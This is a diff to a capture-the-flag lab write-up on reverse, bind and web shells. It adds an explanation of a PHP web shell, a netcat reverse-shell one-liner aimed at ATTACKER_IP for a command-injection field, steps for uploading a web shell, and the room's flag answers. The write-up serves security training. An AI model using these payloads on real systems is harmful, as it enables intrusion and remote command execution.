@@ -422,9 +422,20 @@ if (isset($_GET['cmd'])) {
 ```
 
 ## Explanation:
-1. This is a minimal PHP web shell.
-2. It checks if the cmd parameter exists in the GET request.
-3. If it does, it uses the system() function to execute the command on the server.
+
+
+`if (isset($_GET['cmd'])) {`
+
+- `isset()`: checks whether a variable is set and not null.
+- `$_GET['cmd']`: means it is looking for a GET parameter called `cmd` in the URL.
+- This line basically says: “If someone accesses this script and includes `?cmd=somecommand` in the URL, then execute the code inside the `{}`.”
+
+`system($_GET['cmd']);`
+
+- `system()` is a built-in PHP function that:
+    - Executes a shell command on the server,
+    - Outputs the result directly to the web page.
+- `$_GET['cmd']` will be the command you passed through the URL.
 
 ## Deployment
 1. Save it as shell.php
@@ -474,11 +485,35 @@ let’s get the flag in the format THM{} from the vulnerable web server. Click o
 
 ## Answer the questions below
 
+---
 **Q1. Using a reverse or bind shell, exploit the command injection vulnerability to get a shell. What is the content of the flag saved in the / directory?**
 
-- Go to the landing page located on `10.10.170.217:8080` then click on Reverse/Bind task
+- Go to the landing page located in `10.10.170.217:8080` then click on Reverse/Bind task
 - ![image](https://github.com/user-attachments/assets/77a32e23-3ec5-4bfa-8bbc-fe1b05816f74)
-- set the netcat listener to listen for incoming connection
-- `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f`
+- set the netcat listener to listen for incoming connection `nc -lvnp 443`
+- ![image](https://github.com/user-attachments/assets/e6ac7f99-fd54-4df8-bdec-9ddd15ca41d2)
+- inject this payload into the input field `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f` change the attack ip to your machine ip and the port to your netcat listener, in my case it is `443`
+- ![image](https://github.com/user-attachments/assets/d9b01975-637b-49ad-9baa-af70e80b4cc1)
+- Once the payload has successfully executed, you'll get a reverse shell. from there navigate to the remote directory `cd /` and cat the `flag.txt` file
+- ![image](https://github.com/user-attachments/assets/dc843882-9e71-428e-92b8-8aad7e368cf1)
 
-Ans: *** ***
+Ans: ***THM{0f28b3e1b00becf15d01a1151baf10fd713bc625}***
+
+---
+**Q2. Using a web shell, exploit the unrestricted file upload vulnerability and get a shell. What is the content of the flag saved in the / directory?**
+
+- First create a `shell.php` file in your machine
+- ![image](https://github.com/user-attachments/assets/f294d5d7-66fe-43b0-b1e5-86a5ee473743)
+- upload the `shell.php` file to `10.10.170.217:8082`
+- ![image](https://github.com/user-attachments/assets/c129ce6d-40db-4b75-a961-ec3a4eb6bc15)
+- in the hint, it says that all files are stored in the `/uploads/` directory of the website
+- navigate to the `10.10.170.217:8082/uploads/shell.php?cmd=cat /flag.txt` and feed the command to` cat flag.txt` file
+- ![image](https://github.com/user-attachments/assets/dd2e8b0b-10e4-4bac-bd8e-a688a9f05b73)
+ 
+Ans: ***THM{202bb14ed12120b31300cfbbbdd35998786b44e5}***
+
+---
+# Conclution
+
+Reverse Shells establish a connection from a compromised machine back to an attacker’s system. Bind Shells, on the other hand, listen for incoming connections on a compromised machine, and Web Shells offer attackers a unique avenue for exploiting vulnerabilities in web applications.
+
